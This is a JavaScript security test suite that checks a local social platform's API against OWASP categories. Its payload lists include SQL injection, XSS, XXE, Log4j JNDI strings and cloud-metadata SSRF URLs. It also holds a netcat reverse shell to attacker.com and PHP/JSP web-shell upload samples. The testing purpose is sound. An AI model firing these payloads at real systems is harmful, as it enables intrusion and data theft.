const axios = require('axios');
const fs = require('fs');
const path = require('path');

class ComprehensiveSecurityTester {
  constructor(baseURL = 'http://localhost:4000') {
    this.baseURL = baseURL;
    this.results = [];
    this.authToken = null;
    this.testUserId = null;
  }

  async runAllTests() {
    console.log('🔒 Starting CRYB Platform Comprehensive Security Test Suite');
    console.log('Target:', this.baseURL);
    console.log('=' .repeat(60));

    try {
      // Setup test user
      await this.setupTestUser();

      // Run OWASP Top 10 tests
      await this.testInjectionVulnerabilities(); // A03:2021 - Injection
      await this.testBrokenAuthentication(); // A07:2021 - Identification and Authentication Failures
      await this.testSensitiveDataExposure(); // A02:2021 - Cryptographic Failures
      await this.testXMLExternalEntities(); // A05:2021 - Security Misconfiguration (includes XXE)
      await this.testBrokenAccessControl(); // A01:2021 - Broken Access Control
      await this.testSecurityMisconfiguration(); // A05:2021 - Security Misconfiguration
      await this.testXSS(); // A03:2021 - Injection (XSS)
      await this.testInsecureDeserialization(); // A08:2021 - Software and Data Integrity Failures
      await this.testVulnerableComponents(); // A06:2021 - Vulnerable and Outdated Components
      await this.testInsufficientLogging(); // A09:2021 - Security Logging and Monitoring Failures
      await this.testServerSideRequestForgery(); // A10:2021 - Server-Side Request Forgery

      // Additional security tests
      await this.testCSRFProtection();
      await this.testRateLimiting();
      await this.testInputSanitization();
      await this.testFileUploadSecurity();
      await this.testAPISecurityHeaders();
      await this.testPasswordSecurity();
      await this.testSessionManagement();
      await this.testTLSConfiguration();

      // Generate report
      this.generateReport();
      
      console.log('\n🎉 Security testing completed!');
      console.log(`Results saved to: security-test-report.json`);

    } catch (error) {
      console.error('Security testing failed:', error.message);
      process.exit(1);
    }
  }

  async setupTestUser() {
    const userData = {
      username: 'sectest_' + Date.now(),
      email: `sectest_${Date.now()}@example.com`,
      password: 'SecTest123!'
    };

    try {
      const response = await axios.post(`${this.baseURL}/api/auth/register`, userData);
      this.authToken = response.data.token;
      this.testUserId = response.data.user.id;
      console.log('✓ Test user created for security testing');
    } catch (error) {
      console.log('! Using existing test user or continuing without auth');
    }
  }

  async testInjectionVulnerabilities() {
    console.log('\n🧪 Testing Injection Vulnerabilities (A03:2021)');
    
    const injectionPayloads = [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "'; SELECT * FROM users WHERE ''='",
      "admin'/*",
      "' UNION SELECT null,username,password FROM users--",
      "1' AND (SELECT COUNT(*) FROM users) > 0--",
      "<script>alert('xss')</script>",
      "javascript:alert('xss')",
      "${7*7}",
      "{{7*7}}",
      "<%=7*7%>",
      "${jndi:ldap://evil.com/a}",
    ];

    for (const payload of injectionPayloads) {
      try {
        // Test SQL injection in search
        const searchResponse = await axios.get(`${this.baseURL}/api/search`, {
          params: { q: payload },
          timeout: 5000
        });

        if (searchResponse.data && searchResponse.data.error && 
            searchResponse.data.error.toLowerCase().includes('sql')) {
          this.addResult('SQL_INJECTION', 'FAIL', `SQL error exposed with payload: ${payload}`);
        } else {
          this.addResult('SQL_INJECTION', 'PASS', `SQL injection filtered for payload: ${payload}`);
        }

        // Test XSS in post creation
        if (this.authToken) {
          const postResponse = await axios.post(`${this.baseURL}/api/posts`, {
            title: `Test ${payload}`,
            content: `Content ${payload}`,
            type: 'text',
            community_id: 'test'
          }, {
            headers: { Authorization: `Bearer ${this.authToken}` },
            timeout: 5000
          });

          if (postResponse.data && postResponse.data.post) {
            const title = postResponse.data.post.title;
            const content = postResponse.data.post.content;
            
            if (title.includes('<script>') || content.includes('<script>')) {
              this.addResult('XSS_INJECTION', 'FAIL', `XSS payload not sanitized: ${payload}`);
            } else {
              this.addResult('XSS_INJECTION', 'PASS', `XSS payload sanitized: ${payload}`);
            }
          }
        }

      } catch (error) {
        if (error.code === 'ECONNABORTED') {
          this.addResult('INJECTION_TIMEOUT', 'FAIL', `Request timed out with payload: ${payload} (possible DoS)`);
        } else {
          this.addResult('INJECTION_ERROR', 'PASS', `Injection attempt blocked: ${payload}`);
        }
      }
    }
  }

  async testBrokenAuthentication() {
    console.log('\n🔐 Testing Authentication Vulnerabilities (A07:2021)');

    // Test weak passwords
    const weakPasswords = ['123456', 'password', 'admin', 'test', ''];
    for (const password of weakPasswords) {
      try {
        const response = await axios.post(`${this.baseURL}/api/auth/register`, {
          username: `weak_${Date.now()}`,
          email: `weak_${Date.now()}@example.com`,
          password: password
        });
        
        if (response.status === 201) {
          this.addResult('WEAK_PASSWORD', 'FAIL', `Weak password accepted: ${password}`);
        }
      } catch (error) {
        this.addResult('WEAK_PASSWORD', 'PASS', `Weak password rejected: ${password}`);
      }
    }

    // Test JWT token vulnerabilities
    if (this.authToken) {
      // Test token without signature
      const tokenParts = this.authToken.split('.');
      const unsignedToken = `${tokenParts[0]}.${tokenParts[1]}.`;
      
      try {
        const response = await axios.get(`${this.baseURL}/api/auth/me`, {
          headers: { Authorization: `Bearer ${unsignedToken}` }
        });
        
        if (response.status === 200) {
          this.addResult('JWT_UNSIGNED', 'FAIL', 'Unsigned JWT token accepted');
        }
      } catch (error) {
        this.addResult('JWT_UNSIGNED', 'PASS', 'Unsigned JWT token rejected');
      }

      // Test modified token
      const modifiedToken = this.authToken.slice(0, -5) + 'XXXXX';
      try {
        const response = await axios.get(`${this.baseURL}/api/auth/me`, {
          headers: { Authorization: `Bearer ${modifiedToken}` }
        });
        
        if (response.status === 200) {
          this.addResult('JWT_MODIFIED', 'FAIL', 'Modified JWT token accepted');
        }
      } catch (error) {
        this.addResult('JWT_MODIFIED', 'PASS', 'Modified JWT token rejected');
      }
    }

    // Test credential stuffing protection
    const attempts = [];
    for (let i = 0; i < 10; i++) {
      attempts.push(axios.post(`${this.baseURL}/api/auth/login`, {
        email: 'nonexistent@example.com',
        password: 'wrongpassword'
      }));
    }

    try {
      const responses = await Promise.allSettled(attempts);
      const rateLimited = responses.filter(r => 
        r.status === 'fulfilled' && r.value.status === 429
      ).length;

      if (rateLimited > 0) {
        this.addResult('RATE_LIMITING', 'PASS', 'Rate limiting active for auth attempts');
      } else {
        this.addResult('RATE_LIMITING', 'FAIL', 'No rate limiting detected for auth attempts');
      }
    } catch (error) {
      this.addResult('RATE_LIMITING', 'UNKNOWN', 'Could not test rate limiting');
    }
  }

  async testSensitiveDataExposure() {
    console.log('\n🔍 Testing Sensitive Data Exposure (A02:2021)');

    try {
      // Test if passwords are returned in API responses
      if (this.authToken) {
        const response = await axios.get(`${this.baseURL}/api/auth/me`, {
          headers: { Authorization: `Bearer ${this.authToken}` }
        });

        if (response.data && response.data.user) {
          if (response.data.user.password) {
            this.addResult('PASSWORD_EXPOSURE', 'FAIL', 'Password returned in API response');
          } else {
            this.addResult('PASSWORD_EXPOSURE', 'PASS', 'Password not exposed in API response');
          }
        }
      }

      // Test for information disclosure in error messages
      const errorTests = [
        { url: '/api/users/nonexistent', expected: 'generic error' },
        { url: '/api/posts/invalid-id', expected: 'generic error' },
        { url: '/api/communities/00000000-0000-0000-0000-000000000000', expected: 'generic error' }
      ];

      for (const test of errorTests) {
        try {
          const response = await axios.get(`${this.baseURL}${test.url}`);
        } catch (error) {
          if (error.response && error.response.data) {
            const errorMessage = JSON.stringify(error.response.data).toLowerCase();
            
            if (errorMessage.includes('database') || errorMessage.includes('sql') || 
                errorMessage.includes('table') || errorMessage.includes('column')) {
              this.addResult('ERROR_DISCLOSURE', 'FAIL', `Database info leaked in error: ${test.url}`);
            } else {
              this.addResult('ERROR_DISCLOSURE', 'PASS', `Generic error message for: ${test.url}`);
            }
          }
        }
      }

    } catch (error) {
      this.addResult('DATA_EXPOSURE_TEST', 'ERROR', error.message);
    }
  }

  async testXMLExternalEntities() {
    console.log('\n📄 Testing XXE Vulnerabilities (A05:2021)');

    const xxePayloads = [
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]><foo>&xxe;</foo>',
      '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/evil.dtd">]><foo>&xxe;</foo>'
    ];

    for (const payload of xxePayloads) {
      try {
        const response = await axios.post(`${this.baseURL}/api/posts`, payload, {
          headers: { 
            'Content-Type': 'application/xml',
            Authorization: this.authToken ? `Bearer ${this.authToken}` : ''
          },
          timeout: 5000
        });

        if (response.data && typeof response.data === 'string' && 
            (response.data.includes('root:') || response.data.includes('localhost'))) {
          this.addResult('XXE_VULNERABILITY', 'FAIL', 'XXE vulnerability detected - file contents exposed');
        } else {
          this.addResult('XXE_PROTECTION', 'PASS', 'XXE payload handled safely');
        }

      } catch (error) {
        this.addResult('XXE_PROTECTION', 'PASS', 'XXE payload blocked or XML not accepted');
      }
    }
  }

  async testBrokenAccessControl() {
    console.log('\n🚪 Testing Broken Access Control (A01:2021)');

    if (!this.authToken) {
      console.log('⚠️  Skipping access control tests - no auth token');
      return;
    }

    // Test horizontal privilege escalation
    try {
      // Try to access another user's data
      const response = await axios.get(`${this.baseURL}/api/users/00000000-0000-0000-0000-000000000001`, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      if (response.status === 200) {
        this.addResult('HORIZONTAL_ESCALATION', 'FAIL', 'Can access other user data');
      }
    } catch (error) {
      if (error.response && error.response.status === 403) {
        this.addResult('HORIZONTAL_ESCALATION', 'PASS', 'Access to other user data blocked');
      }
    }

    // Test vertical privilege escalation
    try {
      const response = await axios.get(`${this.baseURL}/api/admin/users`, {
        headers: { Authorization: `Bearer ${this.authToken}` }
      });

      if (response.status === 200) {
        this.addResult('VERTICAL_ESCALATION', 'FAIL', 'Regular user can access admin endpoints');
      }
    } catch (error) {
      if (error.response && (error.response.status === 403 || error.response.status === 404)) {
        this.addResult('VERTICAL_ESCALATION', 'PASS', 'Admin endpoints protected from regular users');
      }
    }

    // Test IDOR (Insecure Direct Object Reference)
    const idorTests = [
      '/api/posts/1',
      '/api/comments/1',
      '/api/communities/1',
      '/api/messages/1'
    ];

    for (const endpoint of idorTests) {
      try {
        // First, try to delete with sequential ID
        const deleteResponse = await axios.delete(`${this.baseURL}${endpoint}`, {
          headers: { Authorization: `Bearer ${this.authToken}` }
        });

        if (deleteResponse.status === 200) {
          this.addResult('IDOR_VULNERABILITY', 'FAIL', `IDOR vulnerability in ${endpoint}`);
        }
      } catch (error) {
        if (error.response && error.response.status === 403) {
          this.addResult('IDOR_PROTECTION', 'PASS', `IDOR protection working for ${endpoint}`);
        }
      }
    }
  }

  async testSecurityMisconfiguration() {
    console.log('\n⚙️  Testing Security Misconfiguration (A05:2021)');

    // Test for exposed admin interfaces
    const adminPaths = [
      '/admin',
      '/administrator',
      '/wp-admin',
      '/phpmyadmin',
      '/api/admin',
      '/dashboard',
      '/config',
      '/debug',
      '/.env',
      '/.git',
      '/swagger',
      '/api-docs'
    ];

    for (const path of adminPaths) {
      try {
        const response = await axios.get(`${this.baseURL}${path}`, { timeout: 3000 });
        
        if (response.status === 200) {
          this.addResult('EXPOSED_INTERFACE', 'FAIL', `Exposed interface at ${path}`);
        }
      } catch (error) {
        if (error.response && error.response.status !== 404) {
          this.addResult('INTERFACE_PROTECTION', 'PASS', `Interface ${path} properly secured`);
        }
      }
    }

    // Test HTTP methods
    const methods = ['OPTIONS', 'TRACE', 'CONNECT', 'PATCH'];
    
    for (const method of methods) {
      try {
        const response = await axios({
          method: method,
          url: `${this.baseURL}/api/posts`,
          timeout: 3000
        });

        if (method === 'TRACE' && response.status === 200) {
          this.addResult('HTTP_TRACE', 'FAIL', 'HTTP TRACE method enabled (XST vulnerability)');
        } else if (method === 'OPTIONS' && response.headers['access-control-allow-methods']) {
          const allowedMethods = response.headers['access-control-allow-methods'];
          if (allowedMethods.includes('TRACE')) {
            this.addResult('CORS_TRACE', 'FAIL', 'TRACE method allowed via CORS');
          }
        }
      } catch (error) {
        // Method blocked - this is good
        this.addResult('HTTP_METHOD_SECURITY', 'PASS', `${method} method properly restricted`);
      }
    }
  }

  async testXSS() {
    console.log('\n🎭 Testing Cross-Site Scripting (A03:2021)');

    const xssPayloads = [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(\'XSS\')">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<input onfocus="alert(\'XSS\')" autofocus>',
      '<select onfocus="alert(\'XSS\')" autofocus><option>test</option></select>',
      '<textarea onfocus="alert(\'XSS\')" autofocus>test</textarea>',
      '<keygen onfocus="alert(\'XSS\')" autofocus>',
      '<video><source onerror="alert(\'XSS\')">',
      '<audio src="x" onerror="alert(\'XSS\')">',
      '"><script>alert("XSS")</script>',
      '\'-alert(\'XSS\')-\'',
      '\"><script>alert(String.fromCharCode(88,83,83))</script>'
    ];

    if (!this.authToken) {
      console.log('⚠️  Skipping XSS tests - no auth token');
      return;
    }

    for (const payload of xssPayloads) {
      try {
        // Test XSS in post content
        const postResponse = await axios.post(`${this.baseURL}/api/posts`, {
          title: `XSS Test ${Date.now()}`,
          content: payload,
          type: 'text',
          community_id: 'test'
        }, {
          headers: { Authorization: `Bearer ${this.authToken}` },
          timeout: 5000
        });

        if (postResponse.data && postResponse.data.post) {
          const content = postResponse.data.post.content;
          
          if (content.includes('<script>') || content.includes('onerror=') || 
              content.includes('onload=') || content.includes('javascript:')) {
            this.addResult('XSS_STORED', 'FAIL', `Stored XSS vulnerability with payload: ${payload}`);
          } else {
            this.addResult('XSS_PROTECTION', 'PASS', `XSS payload sanitized: ${payload}`);
          }
        }

        // Test XSS in comment
        const commentResponse = await axios.post(`${this.baseURL}/api/comments`, {
          content: payload,
          post_id: 'test'
        }, {
          headers: { Authorization: `Bearer ${this.authToken}` },
          timeout: 5000
        });

        if (commentResponse.data && commentResponse.data.comment) {
          const content = commentResponse.data.comment.content;
          
          if (content.includes('<script>') || content.includes('onerror=') || 
              content.includes('onload=')) {
            this.addResult('XSS_COMMENT', 'FAIL', `XSS in comment with payload: ${payload}`);
          } else {
            this.addResult('XSS_COMMENT_PROTECTION', 'PASS', `Comment XSS payload sanitized: ${payload}`);
          }
        }

      } catch (error) {
        // XSS attempt blocked
        this.addResult('XSS_BLOCKED', 'PASS', `XSS payload blocked: ${payload}`);
      }
    }

    // Test reflected XSS in search
    for (const payload of xssPayloads.slice(0, 5)) { // Test subset for reflected XSS
      try {
        const response = await axios.get(`${this.baseURL}/api/search`, {
          params: { q: payload },
          timeout: 3000
        });

        if (response.data && JSON.stringify(response.data).includes(payload)) {
          this.addResult('REFLECTED_XSS', 'FAIL', `Reflected XSS in search: ${payload}`);
        } else {
          this.addResult('REFLECTED_XSS_PROTECTION', 'PASS', `Reflected XSS blocked: ${payload}`);
        }
      } catch (error) {
        this.addResult('REFLECTED_XSS_BLOCKED', 'PASS', `Reflected XSS payload blocked: ${payload}`);
      }
    }
  }

  async testInsecureDeserialization() {
    console.log('\n📦 Testing Insecure Deserialization (A08:2021)');

    const deserializationPayloads = [
      'O:8:"stdClass":1:{s:4:"test";s:4:"test";}', // PHP serialized object
      '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').exec(\'ls\', function(error, stdout, stderr) { console.log(stdout) });}()"}', // Node.js
      '{"\u0000*\u0000command":"id"}', // Null byte injection
      'java.lang.Runtime.getRuntime().exec("whoami");' // Java
    ];

    for (const payload of deserializationPayloads) {
      try {
        // Test in JSON POST requests
        const response = await axios.post(`${this.baseURL}/api/posts`, payload, {
          headers: { 
            'Content-Type': 'application/json',
            Authorization: this.authToken ? `Bearer ${this.authToken}` : ''
          },
          timeout: 5000
        });

        // Check if server executed any commands (this would be bad)
        if (response.data && response.data.toString().includes('uid=') || 
            response.data.toString().includes('root') ||
            response.data.toString().includes('whoami')) {
          this.addResult('DESERIALIZATION_RCE', 'FAIL', 'Remote code execution via deserialization');
        } else {
          this.addResult('DESERIALIZATION_SAFE', 'PASS', 'Deserialization payload handled safely');
        }

      } catch (error) {
        this.addResult('DESERIALIZATION_BLOCKED', 'PASS', 'Deserialization payload blocked');
      }
    }
  }

  async testVulnerableComponents() {
    console.log('\n🔧 Testing Vulnerable Components (A06:2021)');

    try {
      // Test for common vulnerable endpoints
      const endpoints = [
        '/package.json',
        '/composer.json',
        '/requirements.txt',
        '/Gemfile',
        '/pom.xml',
        '/bower.json',
        '/yarn.lock',
        '/package-lock.json'
      ];

      for (const endpoint of endpoints) {
        try {
          const response = await axios.get(`${this.baseURL}${endpoint}`, { timeout: 3000 });
          
          if (response.status === 200) {
            this.addResult('DEPENDENCY_EXPOSURE', 'FAIL', `Dependencies exposed at ${endpoint}`);
          }
        } catch (error) {
          this.addResult('DEPENDENCY_PROTECTED', 'PASS', `Dependencies protected at ${endpoint}`);
        }
      }

      // Check server headers for version information
      const response = await axios.get(`${this.baseURL}/api/health`);
      const headers = response.headers;
      
      if (headers.server) {
        this.addResult('SERVER_HEADER', 'FAIL', `Server header exposed: ${headers.server}`);
      } else {
        this.addResult('SERVER_HEADER', 'PASS', 'Server header not exposed');
      }

      if (headers['x-powered-by']) {
        this.addResult('X_POWERED_BY', 'FAIL', `X-Powered-By header exposed: ${headers['x-powered-by']}`);
      } else {
        this.addResult('X_POWERED_BY', 'PASS', 'X-Powered-By header not exposed');
      }

    } catch (error) {
      this.addResult('COMPONENT_TEST', 'ERROR', error.message);
    }
  }

  async testInsufficientLogging() {
    console.log('\n📝 Testing Security Logging (A09:2021)');

    // Test if security events are logged (we can't directly test logs, but we can test responses)
    const securityEvents = [
      { action: 'failed_login', test: () => axios.post(`${this.baseURL}/api/auth/login`, { email: 'fake@example.com', password: 'wrong' }) },
      { action: 'invalid_token', test: () => axios.get(`${this.baseURL}/api/auth/me`, { headers: { Authorization: 'Bearer invalid' } }) },
      { action: 'unauthorized_access', test: () => axios.delete(`${this.baseURL}/api/posts/test`) }
    ];

    for (const event of securityEvents) {
      try {
        await event.test();
      } catch (error) {
        if (error.response) {
          // Check if error response includes tracking information
          if (error.response.headers['x-request-id'] || error.response.headers['x-trace-id']) {
            this.addResult('SECURITY_LOGGING', 'PASS', `${event.action} appears to be tracked`);
          } else {
            this.addResult('SECURITY_LOGGING', 'WARN', `${event.action} may not be properly logged`);
          }
        }
      }
    }
  }

  async testServerSideRequestForgery() {
    console.log('\n🌐 Testing SSRF (A10:2021)');

    const ssrfPayloads = [
      'http://169.254.169.254/latest/meta-data/', // AWS metadata
      'http://localhost:22',
      'http://127.0.0.1:22',
      'http://0.0.0.0:22',
      'file:///etc/passwd',
      'gopher://127.0.0.1:22',
      'dict://127.0.0.1:22',
      'http://169.254.169.254/computeMetadata/v1/', // GCP metadata
      'http://metadata.google.internal/computeMetadata/v1/'
    ];

    // Test SSRF in image upload or URL processing endpoints
    for (const payload of ssrfPayloads) {
      try {
        // Test if app processes external URLs
        const response = await axios.post(`${this.baseURL}/api/posts`, {
          title: 'SSRF Test',
          content: `Image: ${payload}`,
          type: 'link',
          url: payload
        }, {
          headers: this.authToken ? { Authorization: `Bearer ${this.authToken}` } : {},
          timeout: 10000
        });

        // If response contains metadata or internal information
        if (response.data && JSON.stringify(response.data).match(/ami-|instance-id|private-ip/)) {
          this.addResult('SSRF_VULNERABILITY', 'FAIL', `SSRF vulnerability with payload: ${payload}`);
        } else {
          this.addResult('SSRF_PROTECTION', 'PASS', `SSRF payload blocked: ${payload}`);
        }

      } catch (error) {
        if (error.code === 'ECONNABORTED') {
          this.addResult('SSRF_TIMEOUT', 'WARN', `SSRF request timed out: ${payload}`);
        } else {
          this.addResult('SSRF_BLOCKED', 'PASS', `SSRF payload blocked: ${payload}`);
        }
      }
    }
  }

  async testCSRFProtection() {
    console.log('\n🔒 Testing CSRF Protection');

    if (!this.authToken) {
      console.log('⚠️  Skipping CSRF tests - no auth token');
      return;
    }

    try {
      // Test if state-changing operations require CSRF tokens
      const response = await axios.post(`${this.baseURL}/api/posts`, {
        title: 'CSRF Test Post',
        content: 'Testing CSRF protection',
        type: 'text'
      }, {
        headers: { 
          Authorization: `Bearer ${this.authToken}`,
          'Origin': 'https://evil.com',
          'Referer': 'https://evil.com/attack.html'
        }
      });

      if (response.status === 201) {
        this.addResult('CSRF_PROTECTION', 'FAIL', 'Cross-origin request succeeded without CSRF token');
      }
    } catch (error) {
      if (error.response && error.response.status === 403) {
        this.addResult('CSRF_PROTECTION', 'PASS', 'Cross-origin request blocked');
      }
    }
  }

  async testRateLimiting() {
    console.log('\n⏱️  Testing Rate Limiting');

    const endpoints = [
      '/api/auth/login',
      '/api/auth/register',
      '/api/posts',
      '/api/comments'
    ];

    for (const endpoint of endpoints) {
      const requests = [];
      
      // Make rapid requests
      for (let i = 0; i < 20; i++) {
        const requestData = endpoint.includes('auth') ? 
          { email: `test${i}@example.com`, password: 'test123' } :
          { title: `Test ${i}`, content: `Content ${i}` };

        requests.push(
          axios.post(`${this.baseURL}${endpoint}`, requestData, {
            headers: this.authToken && !endpoint.includes('auth') ? 
              { Authorization: `Bearer ${this.authToken}` } : {}
          })
        );
      }

      try {
        const responses = await Promise.allSettled(requests);
        const rateLimited = responses.filter(r => 
          r.status === 'fulfilled' && r.value.status === 429
        ).length;

        if (rateLimited > 0) {
          this.addResult('RATE_LIMITING', 'PASS', `Rate limiting active on ${endpoint}`);
        } else {
          this.addResult('RATE_LIMITING', 'FAIL', `No rate limiting detected on ${endpoint}`);
        }
      } catch (error) {
        this.addResult('RATE_LIMITING', 'ERROR', `Error testing rate limiting on ${endpoint}`);
      }
    }
  }

  async testInputSanitization() {
    console.log('\n🧹 Testing Input Sanitization');

    const maliciousInputs = [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
      '$(whoami)',
      '`whoami`',
      '; cat /etc/passwd',
      '| nc -e /bin/sh attacker.com 4444',
      '\x00\x01\x02\x03',  // Null bytes
      'A' * 10000,  // Buffer overflow attempt
      '<script>alert(1)</script>',
      '${jndi:ldap://evil.com/a}',  // Log4j style
    ];

    if (!this.authToken) return;

    for (const input of maliciousInputs) {
      try {
        const response = await axios.post(`${this.baseURL}/api/posts`, {
          title: input,
          content: input,
          type: 'text'
        }, {
          headers: { Authorization: `Bearer ${this.authToken}` }
        });

        if (response.data && response.data.post) {
          const title = response.data.post.title;
          const content = response.data.post.content;

          if (title === input || content === input) {
            this.addResult('INPUT_SANITIZATION', 'FAIL', `Malicious input not sanitized: ${input.substring(0, 50)}`);
          } else {
            this.addResult('INPUT_SANITIZATION', 'PASS', `Input properly sanitized: ${input.substring(0, 50)}`);
          }
        }
      } catch (error) {
        this.addResult('INPUT_SANITIZATION', 'PASS', `Malicious input blocked: ${input.substring(0, 50)}`);
      }
    }
  }

  async testFileUploadSecurity() {
    console.log('\n📁 Testing File Upload Security');

    const maliciousFiles = [
      { name: 'test.php', content: '<?php system($_GET["cmd"]); ?>', type: 'application/x-php' },
      { name: 'test.jsp', content: '<% Runtime.getRuntime().exec("whoami"); %>', type: 'application/x-jsp' },
      { name: 'test.exe', content: 'MZ\x90\x00\x03\x00\x00\x00', type: 'application/x-msdownload' },
      { name: '../../evil.php', content: 'malicious', type: 'text/plain' },
      { name: 'test.html', content: '<script>alert("xss")</script>', type: 'text/html' },
      { name: 'test.svg', content: '<svg onload="alert(1)">test</svg>', type: 'image/svg+xml' }
    ];

    if (!this.authToken) return;

    for (const file of maliciousFiles) {
      try {
        const formData = new FormData();
        const blob = new Blob([file.content], { type: file.type });
        formData.append('file', blob, file.name);

        const response = await axios.post(`${this.baseURL}/api/uploads/image`, formData, {
          headers: {
            Authorization: `Bearer ${this.authToken}`,
            'Content-Type': 'multipart/form-data'
          }
        });

        if (response.status === 200) {
          this.addResult('FILE_UPLOAD_SECURITY', 'FAIL', `Malicious file uploaded: ${file.name}`);
        }
      } catch (error) {
        if (error.response && error.response.status === 400) {
          this.addResult('FILE_UPLOAD_SECURITY', 'PASS', `Malicious file rejected: ${file.name}`);
        }
      }
    }
  }

  async testAPISecurityHeaders() {
    console.log('\n🛡️  Testing Security Headers');

    try {
      const response = await axios.get(`${this.baseURL}/api/health`);
      const headers = response.headers;

      // Check for important security headers
      const securityHeaders = [
        { name: 'X-Content-Type-Options', expected: 'nosniff' },
        { name: 'X-Frame-Options', expected: ['DENY', 'SAMEORIGIN'] },
        { name: 'X-XSS-Protection', expected: '1; mode=block' },
        { name: 'Strict-Transport-Security', expected: null },
        { name: 'Content-Security-Policy', expected: null },
        { name: 'Referrer-Policy', expected: null }
      ];

      for (const header of securityHeaders) {
        const value = headers[header.name.toLowerCase()];
        
        if (!value) {
          this.addResult('SECURITY_HEADERS', 'FAIL', `Missing security header: ${header.name}`);
        } else if (header.expected && Array.isArray(header.expected)) {
          if (header.expected.includes(value)) {
            this.addResult('SECURITY_HEADERS', 'PASS', `${header.name}: ${value}`);
          } else {
            this.addResult('SECURITY_HEADERS', 'WARN', `${header.name} has unexpected value: ${value}`);
          }
        } else if (header.expected && value !== header.expected) {
          this.addResult('SECURITY_HEADERS', 'WARN', `${header.name} has unexpected value: ${value}`);
        } else {
          this.addResult('SECURITY_HEADERS', 'PASS', `${header.name}: ${value}`);
        }
      }

      // Check for information disclosure headers
      const infoHeaders = ['Server', 'X-Powered-By', 'X-AspNet-Version'];
      for (const header of infoHeaders) {
        if (headers[header.toLowerCase()]) {
          this.addResult('INFO_DISCLOSURE', 'FAIL', `Information disclosure header: ${header}: ${headers[header.toLowerCase()]}`);
        } else {
          this.addResult('INFO_DISCLOSURE', 'PASS', `No ${header} header found`);
        }
      }

    } catch (error) {
      this.addResult('SECURITY_HEADERS', 'ERROR', error.message);
    }
  }

  async testPasswordSecurity() {
    console.log('\n🔑 Testing Password Security');

    const passwordTests = [
      { password: '123456', expected: 'reject' },
      { password: 'password', expected: 'reject' },
      { password: 'qwerty123', expected: 'reject' },
      { password: 'admin', expected: 'reject' },
      { password: '', expected: 'reject' },
      { password: 'a', expected: 'reject' },
      { password: '12345678', expected: 'reject' }, // Only numbers
      { password: 'abcdefgh', expected: 'reject' }, // Only letters
      { password: 'Password123!', expected: 'accept' }, // Strong password
    ];

    for (const test of passwordTests) {
      try {
        const response = await axios.post(`${this.baseURL}/api/auth/register`, {
          username: `pwtest_${Date.now()}_${Math.random()}`,
          email: `pwtest_${Date.now()}_${Math.random()}@example.com`,
          password: test.password
        });

        if (response.status === 201 && test.expected === 'reject') {
          this.addResult('PASSWORD_POLICY', 'FAIL', `Weak password accepted: ${test.password}`);
        } else if (response.status === 201 && test.expected === 'accept') {
          this.addResult('PASSWORD_POLICY', 'PASS', 'Strong password accepted');
        }
      } catch (error) {
        if (error.response && error.response.status === 400 && test.expected === 'reject') {
          this.addResult('PASSWORD_POLICY', 'PASS', `Weak password rejected: ${test.password}`);
        } else if (error.response && error.response.status === 400 && test.expected === 'accept') {
          this.addResult('PASSWORD_POLICY', 'FAIL', 'Strong password rejected');
        }
      }
    }
  }

  async testSessionManagement() {
    console.log('\n🎫 Testing Session Management');

    if (!this.authToken) return;

    // Test token expiration
    try {
      // This would normally require waiting for token expiration
      // For testing, we can check if the API validates token age
      const oldToken = this.authToken.replace(/.$/, '0'); // Modify token slightly
      
      const response = await axios.get(`${this.baseURL}/api/auth/me`, {
        headers: { Authorization: `Bearer ${oldToken}` }
      });

      if (response.status === 200) {
        this.addResult('TOKEN_VALIDATION', 'FAIL', 'Modified token accepted');
      }
    } catch (error) {
      if (error.response && error.response.status === 401) {
        this.addResult('TOKEN_VALIDATION', 'PASS', 'Invalid token rejected');
      }
    }

    // Test concurrent session limit (if implemented)
    try {
      const loginPromises = [];
      for (let i = 0; i < 5; i++) {
        loginPromises.push(
          axios.post(`${this.baseURL}/api/auth/login`, {
            email: `sectest_${this.testUserId}@example.com`,
            password: 'SecTest123!'
          })
        );
      }

      const responses = await Promise.allSettled(loginPromises);
      const successful = responses.filter(r => r.status === 'fulfilled' && r.value.status === 200).length;

      if (successful >= 5) {
        this.addResult('CONCURRENT_SESSIONS', 'WARN', 'No concurrent session limit detected');
      } else {
        this.addResult('CONCURRENT_SESSIONS', 'PASS', 'Concurrent session limit appears to be in place');
      }
    } catch (error) {
      this.addResult('CONCURRENT_SESSIONS', 'ERROR', 'Could not test concurrent sessions');
    }
  }

  async testTLSConfiguration() {
    console.log('\n🔐 Testing TLS Configuration');

    if (!this.baseURL.startsWith('https://')) {
      this.addResult('TLS_ENABLED', 'FAIL', 'HTTPS not enabled');
      return;
    }

    try {
      // Test HTTPS connection
      const response = await axios.get(this.baseURL.replace('http://', 'https://') + '/api/health');
      
      if (response.status === 200) {
        this.addResult('TLS_CONNECTION', 'PASS', 'HTTPS connection successful');
      }

      // Check HSTS header
      if (response.headers['strict-transport-security']) {
        this.addResult('HSTS', 'PASS', `HSTS enabled: ${response.headers['strict-transport-security']}`);
      } else {
        this.addResult('HSTS', 'FAIL', 'HSTS header missing');
      }

    } catch (error) {
      this.addResult('TLS_CONNECTION', 'FAIL', `HTTPS connection failed: ${error.message}`);
    }
  }

  addResult(testName, status, message) {
    this.results.push({
      timestamp: new Date().toISOString(),
      test: testName,
      status: status,
      message: message
    });

    const statusIcon = {
      'PASS': '✅',
      'FAIL': '❌',
      'WARN': '⚠️',
      'ERROR': '🔧'
    }[status] || '❓';

    console.log(`${statusIcon} ${testName}: ${message}`);
  }

  generateReport() {
    const report = {
      timestamp: new Date().toISOString(),
      target: this.baseURL,
      summary: {
        total: this.results.length,
        passed: this.results.filter(r => r.status === 'PASS').length,
        failed: this.results.filter(r => r.status === 'FAIL').length,
        warnings: this.results.filter(r => r.status === 'WARN').length,
        errors: this.results.filter(r => r.status === 'ERROR').length
      },
